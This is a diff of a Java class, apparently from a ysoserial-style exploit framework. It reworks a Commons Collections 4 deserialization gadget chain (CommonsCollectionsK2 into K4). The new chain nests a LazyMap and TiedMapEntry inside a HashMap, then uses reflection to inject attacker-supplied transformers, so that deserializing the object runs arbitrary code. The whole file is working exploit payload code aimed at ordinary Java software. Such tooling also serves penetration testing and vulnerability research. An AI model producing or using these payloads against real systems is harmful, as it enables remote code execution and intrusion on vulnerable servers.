@@ -1,4 +1,4 @@
-package com.ppp.chain.collections4;
+package com.ppp.chain.commonscollections4;
 
 import com.ppp.ObjectPayload;
 import com.ppp.annotation.Authors;
@@ -8,7 +8,9 @@ import com.ppp.sinks.SinkScheduler;
 import com.ppp.sinks.SinksHelper;
 import com.ppp.sinks.annotation.Sink;
 import com.ppp.utils.Reflections;
-import org.apache.commons.collections4.functors.InvokerTransformer;
+import org.apache.commons.collections4.Transformer;
+import org.apache.commons.collections4.functors.ChainedTransformer;
+import org.apache.commons.collections4.functors.ConstantTransformer;
 import org.apache.commons.collections4.keyvalue.TiedMapEntry;
 import org.apache.commons.collections4.map.LazyMap;
 
@@ -20,11 +22,11 @@ import java.util.Map;
  */
 @Dependencies({"org.apache.commons:commons-collections4:4.0"})
 @Authors({Authors.KORLR})
-@Sink({Sink.TemplatesImpl})
-public class CommonsCollectionsK2 implements ObjectPayload<Object> {
+@Sink({Sink.InvokerTransformer4})
+public class CommonsCollectionsK4 implements ObjectPayload<Object> {
 
     public static void main(String[] args) throws Exception {
-        PayloadRunner.run(CommonsCollectionsK2.class, args);
+        PayloadRunner.run(CommonsCollectionsK4.class, args);
     }
 
     public Object getObject(SinksHelper sinksHelper) throws Exception {
@@ -36,17 +38,19 @@ public class CommonsCollectionsK2 implements ObjectPayload<Object> {
         return kickOffObject;
     }
 
-    public Object getChain(Object templates) throws Exception {
-        InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
-        HashMap<String, String> innerMap = new HashMap();
-        LazyMap lazyMap = LazyMap.lazyMap(innerMap, transformer);
+    public Object getChain(Object transformers) throws Exception {
+        final Transformer transformerChain = new ChainedTransformer(
+                new Transformer[]{new ConstantTransformer(1)});
 
-        Map<Object, Object> hashMap = new HashMap();
-        TiedMapEntry tied = new TiedMapEntry(lazyMap, templates);
+        HashMap<String, String> innerMap = new HashMap<String, String>();
+        LazyMap lazyMap = LazyMap.lazyMap(innerMap, transformerChain);
+
+        Map<Object, Object> hashMap = new HashMap<Object, Object>();
+        TiedMapEntry tied = new TiedMapEntry(lazyMap, "x");
         hashMap.put(tied, "t");
         innerMap.clear();
 
-        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
+        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
         return hashMap;
     }
 }
